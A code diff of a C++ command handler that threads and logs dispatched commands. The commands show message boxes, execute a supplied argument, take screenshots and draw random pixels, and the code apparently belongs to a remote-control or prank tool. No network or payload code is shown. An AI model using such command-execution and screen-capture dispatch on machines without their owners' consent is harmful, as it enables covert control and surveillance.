@@ -19,30 +19,43 @@ std::vector<std::string> CommandHandler::cleanFunctions(const std::string& input
 
 void CommandHandler::callFunction(const std::vector<std::string>& input)
 {
-    /*
-        For now we will just do the basic if clauses. Too lazy to figure out function calling from string rn
-    */
+    //std::cout << "DEBUG: " << input[0] << "SPACE\n";
+    std::cout << "[+] Called callFunction() with args -> ";
+    for(int i = 0; i < input.size(); i++)
+    {
+        std::cout << input[i] << " ";
+    }
+    std::cout << "\n";
 
-    std::cout << "DEBUG: " << input[0] << "SPACE\n";
     if (input[0] == "Message ")
     {
-        commands::showMessageBox({ input[1], input[2] });
-        printf("Called showMessageBox('% s', '% s')\n", input[1].c_str(), input[2].c_str());
+        std::vector<std::string> args = {input[1], input[2]};
+        std::thread t(commands::showMessageBox, std::ref(args));
+        t.join();
     }
 
     if (input[0] == "Execute ")
     {
-        commands::execute({input[1]});
+        std::thread t(commands::execute, std::ref(input[1]));
+        t.join();
     }
 
     if (input[0] == "Cringe ")
     {
-        commands::cringe();
+        std::thread t(commands::cringe);
+        t.join();
     }
 
     if (input[0] == "screentest ")
     {
-        capture::screenshot();
+        std::thread t(commands::Screenshot_C);
+        t.join();
+    }
+    
+    if(input[0] == "randomPixel ")
+    {
+        std::thread t(commands::randomPixel, std::stoi(input[1]), std::stoi(input[2]), 50);
+        t.join();
     }
 
     if(input[0] == "Exit ")
